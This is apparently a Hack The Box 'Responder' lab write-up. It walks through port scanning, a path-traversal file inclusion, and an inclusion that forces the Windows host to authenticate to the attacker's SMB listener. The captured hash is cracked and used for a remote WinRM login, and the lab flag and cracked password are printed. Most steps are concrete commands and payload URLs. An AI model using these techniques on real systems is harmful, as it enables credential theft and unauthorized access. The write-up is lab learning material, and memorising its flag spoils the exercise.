# [Responder] — [Type: HTB | Lab]
**Date**: 2025-09-01  
**Difficulty**: Easy  
**Target IP/URL**: 10.129.41.190 (unika.htb)  
**Objective**: Exploit SQL injection and server-side vulnerabilities to capture the flag

---

## 1. Reconnaissance
**Tools & Commands Used**:
- **Nmap**: Initial scan to identify open ports and services.
- **Quiver**: Used for streamlined pentesting (https://github.com/stevemcilwain/quiver).
  - `qq-enum-host-nmap-top-discovery` (Quiver wrapper):
    - `sudo nmap -vvv -Pn -sS --top-ports 1000 --open -sC -sV 10.129.41.190 -oA /home/kali/Hackthebox/responder/hosts/10.129.41.190/nmap-top-discovery`
  - `qq-enum-host-nmap-all-discovery` (full port scan):
    - `sudo nmap -vvv -Pn -sS -p- --min-rate 1000 -sC -sV --open 10.129.41.190 -oA /home/kali/Hackthebox/responder/hosts/10.129.41.190/nmap-all-discovery`

**Findings**:
- **80/tcp**: Open, running Apache httpd 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1).  
  [Image: nmap-top-scan]
- **5985/tcp**: Open, running Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP, likely WinRM).  
  [Image: nmap-all-scan]
- **3306/tcp**: Open, running MySQL (from second scan).

---

## 2. Enumeration
**Tools & Commands Used**:
- **Nmap**: Service and version detection.
  - `nmap -sC -sV -oN scan.txt -iL ip-address.txt` (target: 10.129.41.190).
- **Manual Web Recon**: Browsed `http://10.129.41.190`, probed paths (`/admin`, `/login`, `/backup`, `/signup`).

**Findings**:
- Browser returned: “We can’t connect to the server at unika.htb.” Indicates name-based virtual hosting.
- Added `10.129.41.190 unika.htb` to `/etc/hosts` to resolve the hostname.
- Visited `http://unika.htb`, changed language, got `http://unika.htb/index.php?page=french.html`. Suspected LFI due to `page` parameter.
- Confirmed MySQL on port 3306, suggesting a potential database-backed web app.

---

## 3. Exploitation
**Vulnerability Identified**:
- **Local File Inclusion (LFI)**: The `page` parameter in `http://unika.htb/index.php?page=` allows arbitrary file inclusion due to unsanitized input in PHP’s `include()` function.
- **No CVE**: Common misconfiguration in PHP apps, not tied to a specific CVE.
- **Why Vulnerable**: The server includes files based on user input without validation, enabling access to local files or triggering protocol-based attacks (e.g., SMB).

**Exploit Steps**:
1. Tested LFI manually with paths from `file_inclusion_windows.txt` (https://github.com/carlospolop/Auto_Wordlists).
   - `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts` returned the Windows `hosts` file.  
     [Image: lfi-result]
   - `http://unika.htb/index.php?page=../../../../xampp/apache/conf/httpd.conf` revealed XAMPP’s Apache config (`ServerRoot "/xampp/apache"`).  
     [Image: lfi-result]
2. Used LFI to trigger SMB authentication:
   - Set up Responder: `sudo ./Responder.py -I tun0 -PvdD` on HTB VPN interface (`tun0`, IP: 10.10.15.53).  
     [Image: responder-scan]
   - Tried `http://unika.htb/index.php?page=\\10.10.15.53\share\test`, captured NetNTLMv2 hash for `Administrator`.  
     [Image: responder-result, responder-web-trigger]
3. Cracked hash with John:
   - `john -w=/usr/share/wordlists/rockyou.txt hash.txt` revealed password: `badminton`.  
     [Image: john-password-crack]
4. Connected via WinRM:
   - `evil-winrm -i 10.129.41.190 -u Administrator -p badminton` accessed `C:\Users\mike\Desktop`.  
     [Image: Evil-WinRM-connect]

---

## 4. Privilege Escalation
**Method**:
- **NTLM Authentication**: Captured NetNTLMv2 hash via LFI-triggered SMB request, cracked to gain Administrator credentials.  
  [Image: NTLM, NTLM vs NThash vs NetNTMLv2]

**Commands & Output**:
- **Responder Setup**:
  - `cat Responder.conf`: Confirmed SMB module enabled (default settings).  
    [Image: responder-result]
- **Hash Capture**:
  - Output: `[SMB] NTLMv2-SSP Username: RESPONDER\Administrator, Hash: Administrator::RESPONDER:097d0f6b1db46702:...`
- **WinRM Access**:
  - `evil-winrm -i 10.129.41.190 -u Administrator -p badminton`
  - Navigated to `C:\Users\mike\Desktop`, found `flag.txt`.

---

## 5. Post-Exploitation
- **Data Exfiltration**: Retrieved `flag.txt` from `C:\Users\mike\Desktop` using `type flag.txt` in WinRM session.
- **Persistence Method**: Not implemented (HTB resets box, no need for persistence).
- **Interesting Files Found**:
  - `C:\xampp\apache\conf\httpd.conf`: Confirmed XAMPP setup.
  - `C:\Users\mike\Desktop\flag.txt`: Contained user flag.

---

## 6. Results
**User Flag**: `ea81b7afddd03efaa0945333ed147fac`  
[Image: flag]

---

## 7. Lessons Learned
**Key Takeaways/Things I Did**:
- From my Nmap scan, I saw port 80/tcp open, running Apache 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1).  
  [Image: nmap-top-scan]
- Visited `http://10.129.41.190`, got “We can’t connect to unika.htb.” Realized it uses name-based virtual hosting.
- Added `10.129.41.190 unika.htb` to `/etc/hosts` to resolve it: `echo "10.129.41.190 unika.htb" | sudo tee -a /etc/hosts`.
- Loaded `http://unika.htb`, changed language, saw `http://unika.htb/index.php?page=french.html`. Suspected LFI in the `page` parameter.
- LFI occurs when a site includes files without sanitizing input, allowing access to unintended files. RFI is similar but uses remote files (e.g., HTTP, FTP).
- Tested LFI with `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts` (from https://github.com/carlospolop/Auto_Wordlists). Got the `hosts` file.  
  [Image: lfi-result]
- Used LFI to read `httpd.conf`, confirmed XAMPP on Windows.
- Exploited LFI to trigger SMB auth with `http://unika.htb/index.php?page=\\10.10.15.53\share\test`. Windows sent a NetNTLMv2 hash to my machine (10.10.15.53).
- Cloned Responder (`git clone https://github.com/lgandx/Responder`), checked `Responder.conf` for SMB settings.  
  [Image: responder-scan]
- Initially failed SMB capture due to wrong interface (used `eth0` instead of `tun0`).
- Cracked hash with John, got `badminton`, then used `evil-winrm` to access the box and find the flag.

**Mistakes to Avoid**:
- Use the correct VPN interface (`tun0` for HTB, not `eth0`) for Responder and LFI triggers.
- Ensure SMB paths use backslashes (`\\`) not forward slashes (`//`) in LFI URLs.
- Double-check network reachability between target and attacker machine.
- Don’t skip manual LFI testing before automating—it confirms the vuln.

---

## 8. Images
- [nmap-top-scan]: Nmap scan showing port 80 open with Apache.
- [nmap-all-scan]: Nmap scan showing port 5985 (WinRM) and 3306 (MySQL).
- [lfi-result]: Successful LFI output for `hosts` and `httpd.conf`.
- [responder-result]: Responder capturing NetNTLMv2 hash.
- [responder-scan]: Responder setup and logs.
- [responder-web-trigger]: LFI URL triggering SMB auth.
- [john-password-crack]: John cracking the hash to reveal `badminton`.
- [Evil-WinRM-connect]: WinRM session accessing the target.
- [NTLM]: Diagram explaining NTLM authentication.
- [NTLM vs NThash vs NetNTMLv2]: Comparison of NTLM variants.
- [flag]: Output of `flag.txt` with `ea81b7afddd03efaa0945333ed147fac`.

---

## 9. References
- Responder: https://github.com/lgandx/Responder
- Auto Wordlists: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
- HackTheBox Writeup: https://www.hackthebox.com/
- Quiver Tool: https://github.com/stevemcilwain/quiver